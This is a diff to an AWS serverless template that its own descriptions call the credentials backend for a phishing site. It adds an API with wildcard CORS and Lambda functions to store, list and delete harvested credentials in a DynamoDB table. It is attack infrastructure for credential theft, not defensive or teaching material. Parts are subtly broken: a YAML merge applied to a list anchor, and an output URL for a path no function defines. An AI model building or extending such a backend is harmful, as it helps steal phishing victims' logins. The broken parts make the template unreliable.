@@ -10,19 +10,35 @@ Globals:
   Function:
     Timeout: 3
     MemorySize: 128
+  Api:
+    Cors:
+      AllowMethods: "'*'"
+      AllowHeaders: "'*'"
+      AllowOrigin: "'*'"
 
 Resources:
+  ApiGatewayApi:
+    Type: AWS::Serverless::Api
+    Properties:
+      StageName: Prod
+
+
+
+
   SaveCredFunction:
     Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction
     Properties:
       CodeUri: save_creds/
       Handler: app.lambda_handler
       Runtime: python3.9
-      Policies:
+      Policies: &iamWritePolicy
         - Version: 2012-10-17
           Statement:
             - Effect: Allow
-              Action: dynamodb:PutItem
+              Action:
+                - dynamodb:PutItem
+                - dynamodb:Scan
+                - dynamodb:DeleteItem
               Resource: !Sub "arn:aws:dynamodb:${AWS::Region}:${AWS::AccountId}:table/saveCreds"
       Architectures:
         - x86_64
@@ -32,6 +48,33 @@ Resources:
           Properties:
             Path: /saveCreds
             Method: post
+            RestApiId: !Ref ApiGatewayApi
+
+
+
+  ManageCredsFunction:
+    Type: AWS::Serverless::Function
+    Properties:
+      CodeUri: manage_creds/
+      Handler: app.lambda_handler
+      Runtime: python3.9
+      Policies:
+        <<: *iamWritePolicy
+      # Add any necessary policies for this function
+      Events:
+        GetCreds:
+          Type: Api
+          Properties:
+            Path: /getAllCreds
+            Method: get 
+            RestApiId: !Ref ApiGatewayApi
+        DeleteCreds:
+          Type: Api
+          Properties:
+            Path: /deleteCred
+            Method: post
+            RestApiId: !Ref ApiGatewayApi
+
   
   DynamoDBTable:
     Type: AWS::DynamoDB::Table
@@ -47,13 +90,24 @@ Resources:
         ReadCapacityUnits: 1
         WriteCapacityUnits: 1
 
+
 Outputs:
   SaveCredApi:
     Description: "API Gateway endpoint URL for Prod stage for saveCreds function"
-    Value: !Sub "https://${ServerlessRestApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/saveCreds/"
+    Value: !Sub "https://${ApiGatewayApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/saveCreds/"
   SaveCredFunction:
     Description: "Save credentials bakend for phising site. Lambda Function ARN"
     Value: !GetAtt SaveCredFunction.Arn
   SaveCredFunctionIamRole:
     Description: "Implicit IAM Role created for Save credentials function"
     Value: !GetAtt SaveCredFunctionRole.Arn
+
+  ManageCredApi:
+    Description: "API Gateway endpoint URL for Prod stage for saveCreds function"
+    Value: !Sub "https://${ApiGatewayApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/manageCreds/"
+  ManageFunction:
+    Description: "Save credentials bakend for phising site. Lambda Function ARN"
+    Value: !GetAtt ManageCredsFunction.Arn
+  ManageFunctionIamRole:
+    Description: "Implicit IAM Role created for Save credentials function"
+    Value: !GetAtt ManageCredsFunctionRole.Arn
